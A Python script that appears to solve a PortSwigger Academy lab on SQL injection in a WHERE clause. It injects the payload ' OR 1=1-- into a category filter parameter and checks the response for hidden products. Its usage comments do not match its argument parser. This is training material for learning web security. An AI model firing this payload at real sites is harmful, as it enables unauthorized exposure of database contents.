#!/usr/bin/python3
# Title: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
# Description: https://portswigger.net/web-security/sql-injection
# Lab: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
# The results in the SQL query: SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
# Example 1 (without proxy intercept): python3 sqli_lab_01.py https://ac621f871f2eb0c6c0fb178700be008e.web-security-academy.net "' OR 1=1--"
# Example 2 (without proxy intercept): python3 sqli_lab_01.py https://ac621f871f2eb0c6c0fb178700be008e.web-security-academy.net "' OR 1=1--" --proxy "http://127.0.0.1:8080"

import requests
import sys
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface():
    def __init__(self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> SQL injection vulnerability in WHERE clause allowing retrieval of hidden data')
        print('    >> by Port Swigger Academy\n')

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success(self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

def exploit_sqli(url, payload, proxies=None):
    uri = "/filter?category="
    try:
        r = requests.get(url+uri+payload, verify=False, proxies=proxies)
        if "Cheshire Cat Grin" in r.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        output.error(f"Request failed: {e}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL Injection exploitation tool")
    parser.add_argument("-u", "--url", help="Target URL (e.g., https://example.com)")
    parser.add_argument("payload", help="SQL Injection payload (e.g., ' OR 1=1 --")
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)

    args = parser.parse_args()

    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        output.info(f"Using proxy: {args.proxy}")

    if exploit_sqli(args.url.strip(), args.payload.strip(), proxies):
        output.success("SQL Injection Successful!")
    else:
        output.error("SQL Injection unsuccessful!")